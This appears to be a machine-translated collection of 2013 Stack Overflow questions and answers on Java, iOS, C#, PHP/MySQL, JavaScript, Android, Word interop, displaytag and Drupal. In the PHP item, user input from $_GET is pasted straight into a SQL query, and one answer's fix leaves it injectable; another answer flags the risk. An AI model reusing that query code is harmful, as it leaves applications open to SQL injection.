我想在 Java 中实现某种命令模式。我想要一个像 `Map<String commandkey, Function()>`. 所以我有一个对象（`Map`,或任何关联...） `HashMap`，`LinkedHashMap`其中键是字符串命令，值是我想通过键调用的函数。这些函数必须是异构的，因为它们可以具有不同的返回值、参数数量、名称（不同的签名）。例如，在 C++ 中，我可以通过 boost::function 创建函数指针或仿函数的映射。所以有人能说出在 Java 中实现这样一个习语（或者如果我们从广义上看是一种模式）的所有方式。我知道两种方法：

1.  反射（减去：缓慢且非常丑陋）
2.  使用接口和匿名类（减号：函数必须具有相同的签名）

详细的解释、文章的链接等将非常有帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T14:13:22.880

1.  java中没有函数指针，只有接口
2.  imo反射并不像很多人想象的那么缓慢和丑陋
3.  您仍然需要知道如何调用该函数（您也需要在 c++ 中知道这一点）所以拥有相同的签名并不是那么糟糕，只需采用非常灵活的签名，例如 `void command(Object... args)`

编辑：关于反射性能：看看这个线程答案：[Java反射性能](https://stackoverflow.com/questions/435553/java-reflection-performance)

您可以看到仅调用反射对象并没有那么慢，而是按名称查找会花费大量时间，而且我认为您的情况是每个函数都不需要多次

# xcode - UIViewController 中的标签，用新文本刷新每个新视图

> ID：15159653
> 
> 赞同：0
> 
> 时间：2013-03-01T14:08:02.680
> 
> 标签：xcode, uiviewcontroller, label

每次你来到这个视图时，它应该始终是随机文本。

我正在寻找剧本，但我什么也没找到！

应用截图：[http ://copticmovies.net/iphone/iphone5-video-logo.png](http://copticmovies.net/iphone/iphone5-video-logo.png)

谢谢你们！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T14:19:08.437

假设您的视图控制器中有一个名为“myLabel”的 UILabel，一种快速且不太优雅的方法是：

```
-(void)viewWillAppear:(BOOL)animated
{
    [super viewWillAppear:animated];

    //quick and dirty random string generation
    NSString *alphabet  = @"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXZY0123456789";
    NSMutableString *s = [NSMutableString stringWithCapacity:20];
    for (NSUInteger i = 0U; i < 20; i++) {
        u_int32_t r = arc4random() % [alphabet length];
        unichar c = [alphabet characterAtIndex:r];
        [s appendFormat:@"%C", c];
    }

    self.myLabel.text = s;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T14:19:46.940

向标签添加一个出口（例如 rdmtext）。在您的 Viewcontroller 中编辑方法：

```
- (void)viewWillAppear:(BOOL)animated 
{
    [super viewWillAppear:animated];
    self.rdmtext.text = @"Your random text from any source";
} 
```

有关更多详细信息，您应该添加要添加的随机文本类型。它存储在哪里？

# c# - 通过 MDIParent 表单元素访问 MDIChild 表单功能

> ID：15159665
> 
> 赞同：1
> 
> 时间：2013-03-01T14:08:37.550
> 
> 标签：c#, mdichild, mdiparent

我有一个`MDIChild`表单，称为从表单和表单`form1`继承的普通表单，该工具栏顶部有一个工具栏顶部有一个新建按钮，当我单击新按钮时，它会在父表单内加载工具栏下方`MDIChild``MDIParent``MDIParent` `form``Form1`

`TextBox`里面有一个`form1`，当我点击保存按钮时，`TextBox` 应该`MessageBox`通过调用它的函数来显示它的值，

但问题是我无法访问该`TextBox` `Text`物业？

我的 MDIParent 表单代码是

```
 public partial class MDIParent1 : Form
{
   // private int childFormNumber = 0;
    MdiClient mdi = null;
    string fname;

    public MDIParent1()
    {
        InitializeComponent();
        foreach (Control c in this.Controls)
        {
            if (c is MdiClient)
            {
                mdi = (MdiClient)c;
                break;
            }
        }
    }

  private void load_form(object form)
    {
        foreach (Form f in mdi.MdiChildren)
        {
            f.Close();

        }
        if (form == null)
            return;
        ((Form)form).MdiParent = this;
        ((Form)form).Show();
        ((Form)form).AutoScroll = true;

        fname = ((Form)form).Name;

    }

 private void newToolStripButton_Click(object sender, EventArgs e)
    {
        load_form(new Form1());
    }

 private void saveToolStripButton_Click(object sender, EventArgs e)
    {
        if (fname == "Form1")
        {
            Form1 f1 = new Form1();
            f1.show_message();

        }

    } 
```

在我的 form1 代码是

```
public void show_message()
    {
        MessageBox.Show(textBox1.Text);
    } 
```

我的 MDIChild 表单代码是

```
 public mdichild()
    {
        InitializeComponent();
        this.Load += new EventHandler(this.mdichild_Load);

    }

    private void mdichild_Load(object sender, EventArgs e)
    {
        this.ControlBox = false;
        this.WindowState = FormWindowState.Maximized;
        this.BringToFront();
        int h = Screen.PrimaryScreen.Bounds.Height;
        int w = Screen.PrimaryScreen.Bounds.Width;
        this.MinimumSize = new Size(w, h);
    } 
```

谁能帮我？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T15:24:12.060

我了解您正在做什么访问 MDIChild 表单数据。尝试这个 ： -

```
 private void ShowNewForm(object sender, EventArgs e)
    {
        Form childForm = new Form();
        childForm.MdiParent = this;
       // childForm.ContextMenuStrip = contextMenuStrip1;
        //this.contextMenuStrip1.ResumeLayout(false);
        RichTextBox text = new RichTextBox();
        text.Dock = DockStyle.Fill;
        childForm.Controls.Add(text);
        childForm.Text = "Page  " + this.MdiChildren.Count();
        childForm.Show();
    }

    private void OpenFile(object sender, EventArgs e)
    {
        OpenFileDialog openFileDialog = new OpenFileDialog();
        openFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
        openFileDialog.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
        if (openFileDialog.ShowDialog(this) == DialogResult.OK)
        {
            string FileName = openFileDialog.FileName;
        }
    }
    private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
    {
        SaveFileDialog saveFileDialog = new SaveFileDialog();
        saveFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
        saveFileDialog.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
        if (saveFileDialog.ShowDialog(this) == DialogResult.OK)
        {
            string FileName = saveFileDialog.FileName;
        }
    } 
```

# php - PHP MySQL 语句什么都不返回？

> ID：15159666
> 
> 赞同：0
> 
> 时间：2013-03-01T14:08:39.123
> 
> 标签：php, mysql, sql

我目前正在开发一个应用程序，它将通过我编写的 PHP 服务与数据库进行通信。

我遇到问题的服务应该根据用户的搜索字符串在表中查找一行或多行。

下面的 PHP 旨在接收带有“名称”变量的 GET 请求，该变量将是 SQL 查询使用的数据。我看不出我的代码有什么问题，但是从搜索返回的行始终为 0。

```
// checks for the post data
if (isset($_GET["name"])) {
    $name = '%' . $_GET['name'] . '%';

    // get a list of products from the database
    $result = mysql_query("SELECT * FROM products WHERE name LIKE $name");

    if (!empty($result)) {
        // check for empty result
        if (mysql_num_rows($result) > 0) {

            $result = mysql_fetch_array($result);

            $products = array();
            $products["id"] = $row["id"];
            $products["name"] = $row["name"];
            $products["type"] = $row["type"];
            $products["price"] = $row["price"];
            $products["photo"] = $row["photo"];
            // success
            $response["success"] = 1;

            // products node
            $response["products"] = array();

            array_push($response["products"], $products);

            // echoing JSON response
            echo json_encode($response);
        } else {
            // no products found
            $response["success"] = 0;
            $response["message"] = "No products found";

            // echo no products JSON
            echo json_encode($response);
        }
    } else {
        // no products found
        $response["success"] = 0;
        $response["message"] = "Search Complete... No products found";

        // echo no products JSON
        echo json_encode($response);
    }
} else {
    // required field is missing
    $response["success"] = 0;
    $response["message"] = "Required field(s) is missing";

    // echoing JSON response
    echo json_encode($response);
} 
```

我在它正在查看的表中有一个条目和一个名为“crisps”的条目，所以当我发送一个带有“cr”数据的 get 请求时，我希望在结果中看到该条目，但是它返回 0 行。

然后更奇怪的是，当我直接对我的数据库运行下面的 SQL 时，它实际上拉回了正确的记录。

```
SELECT * FROM products WHERE name LIKE "%cr%" 
```

有任何想法吗？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:09:23.690

在您的查询中，您需要将引号添加`'` 到您的`'$name'`

```
 $result = mysql_query("SELECT * FROM products WHERE name LIKE '$name'"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T14:09:35.253

因为你没有用单引号包裹这个值，所以记住它是一个字符串文字。

```
SELECT * FROM products WHERE name LIKE '$name' 
```

作为旁注，[`SQL Injection`](http://bobby-tables.com/)如果变量的值（*s*）来自外部，则查询很容易受到攻击。请看下面的文章，了解如何预防。通过使用`PreparedStatements`，您可以摆脱在值周围使用单引号。

*   [如何*防止*PHP 中的 SQL 注入？](https://stackoverflow.com/questions/60174/how-to-prevent-sql-injection-in-php)

# java - 如何在继承的java类的复制构造函数中避免instanceof

> ID：15159675
> 
> 赞同：0
> 
> 时间：2013-03-01T14:09:07.403
> 
> 标签：java, inheritance, copy-constructor, cloning

我正在编写一个用于克隆对象的复制构造函数。当一个类引用了一个对象，该对象被少数其他类进一步继承。

```
class Person
{
    String name;
    Address address;
 }

class HomeAdress extends Address
{
}
class OfficeAdress extends Address
{
} 
```

现在在 Person 的复制构造函数中，要决定要启动哪个 Address 对象，我必须使用 instanceof。

```
public Person(Person p)
{
    name = p.name;
    if(p.address instanceof HomeAddress)
    {
        address = new HomeAddress((HomeAddress) address);
    }else if(p.address instanceof OfficeAddress)
    {
        address = new OfficeAddress((OfficeAddress) address);
    }
} 
```

因此，当将新类型的地址添加到模型中时，基本问题是这样的。我将不得不在 Person 复制构造函数中添加一个相同的检查。有没有办法避免 instanceof 检查实例化正确的地址对象。我可以使用refelction来避免代码中的instanceof吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-01T14:11:16.573

您应该将复制地址的责任委托给`Address`班级。无论您是否实现`Cloneable`，都将一个`clone()`方法放入 中`Address`，然后您可以（如果您需要自定义处理）在每个特定的`Address`子类中覆盖它。然后在您的`Person`复制构造函数中，您只需要：

```
this.address = p.address.clone(); 
```

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2013-03-01T14:15:09.093

首先，我想这是一个错字：

```
address = new HomeAddress((HomeAddress) p.address); 
```

其次，您可以在 Address 类中定义一个 copy() 方法，而不是强制转换对象，（可能是）抽象：

```
abstract class Address {
    abstract Address copy ();
} 
```

并且你在Address的每个子类中实现该方法，然后你可以在Person的构造函数中调用它：

```
public Person(Person p)
{
    name = new String(p.name);
    address = p.address.copy();
} 
```

# javascript - 调用函数而不单击任何内容

> ID：15159676
> 
> 赞同：1
> 
> 时间：2013-03-01T14:09:09.413
> 
> 标签：javascript, html, dom, html-table

我是编程新手，我试图在没有任何按钮或点击事件的情况下调用一个函数。我正在使用 javascript 函数在表中创建一个表。到目前为止，这是我的代码：

```
<html>
<head> <title> Hello </title> </head>
<body>
<table border=1>
    <tr>
        <td> Hello! <input type='hidden' value='0' id='theValue' /> <script> add(); </script> <div id='myDiv'> </div> </td>
    </tr>

<script>
$ctra = 1;
$ctr1a = 1;  
function add() { 
    var ni = document.getElementById('myDiv');
    var numi = document.getElementById('theValue');
    var num = (document.getElementById('theValue').value -1)+ 2;
    numi.value = num;
    var newdiv = document.createElement('div');
    var divIdName = 'my'+num+'Div';
    newdiv.setAttribute('id',divIdName);
    newdiv.innerHTML = "<table border=1>"+
                        "<tr>"+
                        "<td> Hello! <input type='hidden' value='0' id='theValue' /> <script> add(); </script> <div id=('" + divIdName + "')> </div> </td>"+
                        "</tr>"+
                        "</table>";
    if($ctra<100){
        ni.appendChild(newdiv);
        $ctra++;
    }
}
</script>

</table>
</body>
</html> 
```

当我运行它时，它显示

```
"+ ""+ "
Hello!
"; if($ctra<100){ ni.appendChild(newdiv); $ctra++; } } 
```

在浏览器中。问题可能是什么？先感谢您！

**编辑**

```
function add() { 
    var ni = document.getElementById('myDiv');
    var numi = document.getElementById('theValue');
    var num = (document.getElementById('theValue').value -1)+ 2;
    numi.value = num;
    var newdiv = document.createElement('div');
    var divIdName = 'my'+num+'Div';
    newdiv.setAttribute('id',divIdName);
    newdiv.innerHTML = "<table border=1><tr><td> Hello! <input type='hidden' value=0 id='theValue' /><div id='" + divIdName + "'></td></tr></table>";
    ni.appendChild(newdiv);
    for(var i=1;i<100;i++) {
        var ni = document.getElementById(divIdName);
        var numi = document.getElementById('theValue');
        var num = (document.getElementById('theValue').value -1)+ 2;
        numi.value = num;
        var newdiv = document.createElement('div');
        var divIdName = 'my'+num+'Div';
        newdiv.setAttribute('id',divIdName);
        newdiv.innerHTML = "<table border=1><tr><td> Hello! <input type='hidden' value='" + i + "' id='theValue' /><div id='" + divIdName + "'></td></tr></table>";
        ni.appendChild(newdiv);
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T14:20:01.540

试试这个

```
<html>
<head> <title> Hello </title> </head>
<script type="text/javascript">

    $ctra = 1;
    $ctr1a = 1;
    function add() { 
    alert('s')
    var ni = document.getElementById('myDiv');
    var numi = document.getElementById('theValue');
    var num = (document.getElementById('theValue').value -1)+ 2;
    numi.value = num;
    var newdiv = document.createElement('div');
    var divIdName = 'my'+num+'Div';
    newdiv.setAttribute('id',divIdName);
    newdiv.innerHTML = "<table border=1><tr><td> Hello! <input type='hidden' value='0' id='theValue' /></tr></table>";
    if($ctra<100){
        ni.appendChild(newdiv);
        $ctra++;
    }
}

</script>

<body onload="add()">
<table border="1">
    <tr>
        <td> Hello! <input type='hidden' value='0' id='theValue' />

        <div id='myDiv'> </div> </td>
    </tr>
</table>
</body>
</html> 
```

希望对你有帮助..：）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T15:33:44.247

您的 JS 导致嵌套块，这在 html 中是不允许的。您的块中的函数 add() 未定义，因为当浏览器遇到它时，它还没有看到您对 add() 的定义。您的表包含一个脚本，该脚本包含另一个包含另一个脚本的表。这非常令人困惑：P

好的，如果我理解正确的话：你只有一张桌子。你想让 JS 在里面放另一个表。在此示例中，您要放入的内容是表格的副本。您希望最终得到一个表格内的表格，并且您希望以编程方式实现它。

首先将您的关注点分开：脚本和 html：如果您将 add() 放在定义之后并将脚本放在正文之后，那么浏览器将遇到它并运行它。高温：

```
<html>
<head> <title> Hello </title> </head>
<body>
    <table id="t1" border=1>
        <tr>
            <td> Hello! <input type='hidden' value='0' id='theValue' />
                <div id='myDiv'></div>
            </td>
        </tr>
    </table>

<script>
    function add_table() {
        var table1 = document.getElementById("t1"),
            table2 = table1.cloneNode(true),
            mydiv = document.getElementById("myDiv"),
            mydiv2;

        table2.setAttribute('id', 't2');
        mydiv2 = table2.getElementsByTagName("div")[0];
        mydiv2.setAttribute('id', 'myDiv2');
        mydiv.appendChild(table2);
    }
    // call the function
    add_table();

</script>
</body>
</html> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T14:15:34.103

你有`</script>`里面的代码。浏览器将其解释为 javascript 的结束并返回 HTML。要解决此问题，您可以将此字符串划分为例如`</sc'+'ript>`. 这将解决这个问题，但可能你仍然需要在脚本上做一些工作，但那是另一回事。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T14:15:40.197

您必须在不同的引号之间切换，并删除 id 的大括号，如下所示：

```
newdiv.innerHTML = "<table border=1>"
    +"<tr>"
    +'<td> Hello! <input type="hidden" value="0" id="theValue" /> '
    +'<script> add(); </script> <div id="' + divIdName + '"> </div> </td>'
    +"</tr>"
    +"</table>"; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-01T14:16:27.950

因为在 dom 中没有任何 evnt 就无法访问该函数。您必须在元素的任何事件上调用该函数。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-01T14:19:34.780

1.  将表格元素外的脚本移动到头部或正文的末尾。
2.  首先添加div，然后调用脚本。你可能想打电话给`add()`你`<body onload='add'>`
3.  删除此处的大括号以创建有效的 html：`<div id=('" + divIdName + "')>`

# ms-word - 使用 Word 互操作重新激活 COM 插件

> ID：15159688
> 
> 赞同：0
> 
> 时间：2013-03-01T14:09:27.997
> 
> 标签：ms-word, interop, comaddin

我已经为 word 编写了一个自定义功能区。在我的 winForms 应用程序中，我还使用 word-Interop 打开了一个 word 文档，以创建一些带有 word 的文本。

当我使用普通的 word 文档时，我的功能区显示正确，但是当我在应用程序中打开文档时，功能区就消失了。

我发现它在 Word 的 COM-AddIn-Options 中以某种方式被禁用。当我手动重新激活它时，它会出现。

如何以编程方式重新激活它？

[更新]为了更好地理解：我有两个解决方案。1) 一个显示功能区的 Word 插件 2) 一个 winform 应用程序，它有一个可以在其中加载 word 的 winword 控件。

当第二个启动时，第一个不再可用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T14:33:43.497

要回答您的问题，无法从加载项本身以编程方式重新启用您的加载项。想想看 - 它没有被加载，所以它的代码不会运行。因此，您在代码中添加的任何内容都不会重新启用插件，因为它不会被执行。

唯一的方法是创建一个看门狗进程，检查 COM 加载项是否每 10 分钟左右被禁用，然后重新启用它。不过，您需要知道 Word 将这些设置存储在何处。

# android - IntentService 和绑定模式

> ID：15159689
> 
> 赞同：3
> 
> 时间：2013-03-01T14:09:32.453
> 
> 标签：android

我有 IntentService 应该通过绑定使用来自另一个服务的引用：

```
public class BaseIntentService extends IntentService implements ServiceConnection {

    protected NetworkApi network;

    public BaseIntentService() {
        super("BaseIntentService");
    }

    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
        network = ((NetworkApiBinder) service).getApi();
        // never be invoked
    }

    @Override
    public void onServiceDisconnected(ComponentName name) {
    }

    @Override
    public void onCreate() {
        super.onCreate();
        bindService(new Intent(this, NetworkApi.impl), this, BIND_AUTO_CREATE);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        unbindService(this);
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        // network always null!!!
    }
} 
```

但是当我使用这样的绑定时，永远不会调用 onServiceConnected。我知道 IntentService 不是为绑定模式设计的，但可能有针对此类任务的通用解决方案？

谢谢！

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-01T14:22:43.900

> 但是当我使用这样的绑定时，永远不会调用 onServiceConnected

那是因为你`IntentService`在绑定请求开始之前就被销毁了。当完成所有未完成的命令`IntentService`时，会自动销毁。`onHandleIntent()`

> 但可能有此类任务的通用解决方案

不要有两个服务。摆脱`IntentService`并将其逻辑移至其他服务。

# javascript - 如何在内容可编辑的 div 中的插入符号位置附近显示自动建议 div

> ID：15159692
> 
> 赞同：1
> 
> 时间：2013-03-01T14:09:41.867
> 
> 标签：javascript, jquery, contenteditable, autosuggest

我有一个内容可编辑的 div，当我键入一个字符时，我试图在我的插入符号位置附近显示一个自动建议。

* * *

我正在寻找这样的东西..**但下面的代码不起作用**

```
 var editor  = document.getElementById('myDiv');
        var t=$(editor).offset().top;
        var l=$(editor).offset().left;
        var caretPosition = getCaretPosition(editor);
        var autoSuggestionDiv = document.getElementById('divResult');
        autoSuggestionDiv.style.top = t + caretPosition + "px";
        autoSuggestionDiv.style.left = l + caretPosition + 20 + "px";
        var inputSearch = getCharacterPrecedingCaret(editor);
        var dataString = 'searchword='+ inputSearch;
        if(inputSearch!='')
        {
            $.ajax({
            type: "POST",
            url: "Search.aspx",
            data: dataString,
            cache: false,
            success: function(html)
            {
            $("#divResult").html(html).show();
            }
            });
        } 
```

# c++ - 在 Visual Studio 2010 中查看没有项目的文件的类树

> ID：15159694
> 
> 赞同：0
> 
> 时间：2013-03-01T14:09:47.353
> 
> 标签：c++, visual-studio-2010, visual-studio, class

Visual Studio 2010 中是否有可能查看 CPP 文件的类树而不将其加载到当前项目中？

我想打开几个（头文件、源文件）并能够浏览所有包含的类的所有方法。我在论坛和互联网上搜索过这里，但找不到任何东西。

是否有来自第三方供应商的类似工具？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T15:38:31.460

至少据我所知，VS 不会对您的代码做任何事情，除非它是项目的一部分。

根据您的确切需求，有很多类似的工具。最常见的可能是 doxygen。

许多（大多数？）UML工具还可以从源代码逆向工程（UML）类图，并且相当多的支持“往返”（能够从源代码生成类图，操作UML，然后生成匹配的新代码编辑 UML）。

然而，我可能还应该指出，这些工具并不是很受欢迎（事实上，有些人真的很讨厌它们），而且用它们生成类图可能比它们更快或更容易地生成类图的情况非常罕见。创建一个项目文件，以便您可以在 VS 中执行此操作。它们中的大多数都具有 VS 所具备的许多功能，因此如果您想做 VS 不支持的事情，它们可能是值得的。但是，如果您对 VS 产生的结果感到满意，则使用 VS 并创建项目文件可能是获得它的最简单方法。

# scroll - 显示表格的滚动条

> ID：15159696
> 
> 赞同：1
> 
> 时间：2013-03-01T14:09:53.053
> 
> 标签：scroll, struts, displaytag

我想知道如果我在顶部有分页栏，如何在分页栏和开始显示结果的实际之间插入一个`<DIV>`标签。`TABLE`如果我只是将`<DIV>`标签放在我的 display:table 之前，它还包括滚动条内的分页内容。

另外，我无法弄清楚如何将样式设置为，`TBODY`因为它有点令人困惑。我不确定你们是否写了这些东西，但如果你知道如何实现这一点，你能告诉我。我的代码是

```
<display:table id="data1" name="invprbmList" requestURI=""  pagesize="10" export="true" style="width:100%;" decorator="org.displaytag.decorator.TotalTableDecorator">
  <tr><td><display:setProperty name="paging.banner.item_name">Invoice</display:setProperty>
    <display:setProperty name="paging.banner.items_name">Invoices</display:setProperty>
    <display:setProperty name="paging.banner.some_items_found"><span class="pagebanner"> {0} Invoices found, displaying {2} to {3}. </span></display:setProperty>           
    <bean:define id="invoiceNo"><bean:write name="data1" property="invoiceNo"/></bean:define>
    <bean:define id="notes"><bean:write name="data1" property="notes"/></bean:define>
    <bean:define id="strFlag"><bean:write name="data1" property="strFlag"></bean:write></bean:define>

    <display:column  title="Invoice No." sortable="true" property="invoiceNo" media="xml csv pdf excel" class="l" headerClass="hl" />
    <display:column  property="invDate" title="Invoice Date" format="{0,date,dd-MMM-yyyy}" sortable="true" class="l" headerClass="hl"/>
    <display:column  media="html" title="Amount" property="invAmount" format="<%=strDispCurrency %>" sortable="true" class="r" headerClass="hr" />
    <display:column  title="Amount" sortable="true" property="invAmount" media="xml csv pdf excel" class="r" headerClass="hr" />
    <display:column  property="dueDate"     title="Due Date" format="{0,date,dd-MMM-yyyy}" sortable="true" class="l" headerClass="hl"/>
    <display:column  media="html" title="Balance" property="balance" format="<%=strDispCurrency %>" sortable="true" class="r" headerClass="hr" />
    <display:column  title="Balance" sortable="true" property="balance" media="xml csv pdf excel" class="r" headerClass="hr" />
    <display:column  title="Notes" sortable="true" property="notes"  media="xml csv pdf excel"  class="c" headerClass="hc"/>                                                  
    <display:column  property="invPoNum" title="P.O. No." sortable="true"  class="l" headerClass="hl"/>
    <display:column  property="invRefNo" title="Ref. No." sortable="true"  class="lbr" headerClass="hlbr"/>
    <display:column  property="status" title="Status" sortable="true" class="l" headerClass="hl"/>                              
  </td></tr>
</display:table> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-02T14:28:10.700

创建一个`CSS`类`locked-column.css`：

```
div#tbl-container { 
        width: 740px; 
        /* default value will be overrided by minimum of table width or screen 
resolution*/ 
        height: 300px; 
        margin-top: -11px;
        overflow: auto; 
        /* 
                scrollbar-base-color: #ffeaff; 
        */ 
} 

.dataTable { /*table-layout: fixed; */ 
        border-collapse: collapse; 
        /* background-color: WhiteSmoke; */ 
} 

.dataTable th { 
        top: expression(document . getElementById("tbl-container") . scrollTop-2 
                ); /* IE5+ only */ 
        z-index: 20; 
        font-size: small; 
        padding: 5px 5px 5px 5px !important; 
        text-align: center;
        position: relative; 
        cursor: default; 
        font-family: sans-serif; 
        font-size: small; 
        font-weight: bold; 
        background-color: #BBCCFF;
        color: #FFFFF; 
} 

.dataTable thead tr { 
        position: relative; 
        height: 10px; 
        /*background-color: #7CA4E0;*/ 
} 

.dataTable th a:link,th a:visited { 
        color: #1155cc;
        font-weight: bold; 
        text-decoration: none; 
        font-family: sans-serif;
} 

.dataTable a:hover { 
        color: #1155cc;
        text-decoration: underline; 
        font-family: sans-serif; 
        font-weight: bold; 
} 

.dataTable thead  th.sorted A { 
        font-weight: bolder; 
} 

.dataTable td { 
        padding: 3px 3px 3px 3px !important; 
} 

.dataTable tbody tr { 
        height: auto; 
        white-space: nowrap; 
} 

.dataTable tbody tr.odd { 
        background-color: #FFFFFF;
        font-size:  x-small; 
} 

.dataTable tbody tr.tableRowEven,tr.even { 
        background-color: #DDE5FF;
        font-size:  x-small; 
} 

.dataTable tbody tr td:last-child { /* padding-right: 20px; */ 

} 

/*these styles have nothing to do with the locked column*/ 
.dataTable body { 
        background-color: white; 
        color: black; 
        font-family: sans-serif; 
} 

.dataTable tbody td { 
        padding: 2px 4px 2px 4px !important; 
        font-family: sans-serif; 
        font-size: x-small; 
} 

.exportlinks { 
        font-family: sans-serif; 
} 

/* style sheet to display light blue color for a mouse on row over event */ 
.dataTable tr.rowMouseOver { 
        color: white; 
        background-repeat: repeat-x; 
        background-color: rgb(228, 59, 47); /*#8888FF;*/ 
} 

.dataTable .order1 { 
        background-position: right 50%; 
        background-image: url('../Images/arrow_up.gif'); 
        background-repeat: no-repeat; 
        font-weight: bold; 
} 

.dataTable .order2 { 
        background-position: right 50%; 
        background-image: url('../Images/arrow_down.gif'); 
        background-repeat: no-repeat; 
        font-weight: bold; 
} 

span.export { 
        padding: 0 4px 1px 20px; 
        font-size: x-small; 
        text-align: center; 
} 

span.excel { 
        background-image: url('../Images/ico_file_excel.png'); 
        background-repeat: no-repeat; 
        width: 16px; 
} 

span.csv { 
        background-image: url('../Images/ico_file_csv.png'); 
        background-repeat: no-repeat; 
        width: 16px; 
} 

span.xml { 
        background-image: url('../Images/ico_file_xml.png'); 
        background-repeat: no-repeat; 
        width: 16px; 
} 

span.first { 
        background-image: url('../Images/first.jpg'); 
        background-repeat: no-repeat; 
        width: 16px; 
} 

span.last { 
        background-image: url('../Images/last.jpg'); 
        background-repeat: no-repeat; 
        width: 16px; 
} 

span.pdf { 
        background-image: url('../Images/ico_file_pdf.png'); 
        background-repeat: no-repeat; 
        width: 16px; 
} 

span.rtf { 
        background-image: url('../Images/ico_file_rtf.png'); 
        background-repeat: no-repeat; 
        width: 16px; 
} 

.rightAlignedPadded { 
        text-align: right; 
        padding-right: 10px; 
} 
```

`CSS`在你的 JSP 的 JavaScript 中调用这个类：

```
if(navigator.appName == 'Microsoft Internet Explorer') 
{ 
        document.write('<link rel="stylesheet" type="text/css" href="css/locked-column.css" />'); 
} 
else 
{ 
        document.write('<link rel="stylesheet" type="text/css" href="css/displaytag1.css" />'); 
} 
```

并让你`display-tag`成为：

```
 <table>
        <tr><td>
            <div id="tbl-container" style="width: 850px;">
               <display:table name="CustomerList" export="true" id="customerList" class="dataTable" defaultorder="ascending" cellspacing="1" requestURI="" frame="true" decorator="org.displaytag.decorator.TotalTableDecorator"> 
                 <display:setProperty name="export.pdf.filename" value="OverallOverdue.pdf" /> 
                 <display:setProperty name="export.excel.filename" value="OverallOverdue.xls" /> 
                 <display:setProperty name="export.csv" value="true" /> 
                 <display:setProperty name="export.csv.filename" value="OverallOverdue.csv" /> 
                 <display:setProperty name="export.xml" value="true" /> 
                 <display:setProperty name="export.xml.filename" value="OverallOverdue.xml" /> 
                 <display:setProperty name="paging.banner.placement">top</display:setProperty> 
                 .........  
                 </display:table></div> </td></tr>
             <tr><td>&nbsp;</td></tr> 
             <tr><td>
                <div id="export-links"> 
                </div> 
             </td>
            </tr>
        </table> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T10:02:05.420

如果它包含在可滚动中，请输入：

```
<div id="export-links"> 
                </div> 
```

外部`<table>`

可滚动表中不能有不可滚动的元素。也许您可以将该元素定义为绝对位置，并使其成为那样，但我不建议这样做。

使用您的代码尝试如下：

```
 <table>
        <tr><td>
            <div id="tbl-container" style="width: 850px;">
               <display:table name="CustomerList" export="true" id="customerList" class="dataTable" defaultorder="ascending" cellspacing="1" requestURI="" frame="true" decorator="org.displaytag.decorator.TotalTableDecorator"> 
                 <display:setProperty name="export.pdf.filename" value="OverallOverdue.pdf" /> 
                 <display:setProperty name="export.excel.filename" value="OverallOverdue.xls" /> 
                 <display:setProperty name="export.csv" value="true" /> 
                 <display:setProperty name="export.csv.filename" value="OverallOverdue.csv" /> 
                 <display:setProperty name="export.xml" value="true" /> 
                 <display:setProperty name="export.xml.filename" value="OverallOverdue.xml" /> 
                 <display:setProperty name="paging.banner.placement">top</display:setProperty> 
                 .........  
                 </display:table></div> </td></tr>
             <tr><td>&nbsp;</td></tr> 
             <tr><td>

             </td>
            </tr>
        </table>

<div id="export-links"> 
  your links here
</div> 
```

这样它会`not be included`在滚动的表格中

看看我做的这个例子：

[http://jsfiddle.net/LQJY5/](http://jsfiddle.net/LQJY5/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T10:58:37.297

[从http://www.hesido.com/web.php?page=customscrollbar](http://www.hesido.com/web.php?page=customscrollbar)下载 flexcroll.js 和 flexcrollstyles.css并包含这些文件。

```
<table>
 <tr>
  <td width='100%'> Paging: </td>
 </tr>
 <tr>
  <td>
    <div id='customscroll' class='flexcroll' style='height:300px;'>
     <table>
      <tr>
        <td>Your content</td>
      </tr>
     </table>
    </div>
  </td>
 </tr>
</table> 
```

# php - 在 Drupal 7 中生成并附加文件

> ID：15159698
> 
> 赞同：0
> 
> 时间：2013-03-01T14:09:57.270
> 
> 标签：php, drupal, drupal-7

如何在 Drupal 7 中生成（纯文本）文件，并将其自动附加到特定节点。

有没有办法用模块做到这一点，或者我应该使用代码以某种方式做到这一点（这似乎很棘手）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T23:05:30.050

首先使用drupal [file_save_data创建一个文件](http://api.drupal.org/api/drupal/includes!file.inc/function/file_save_data/7)

```
$data = 'Your text data';     // Text data to be saved to file.
$filename = 'filename.txt';   // Filename
$file = file_save_data($data,'public://' .$filename); 
```

现在 $file 将包含我们可以附加到节点的文件对象。假设您已经创建了一个文件字段并将其附加到节点类型。让我们称之为“field_custom_file”

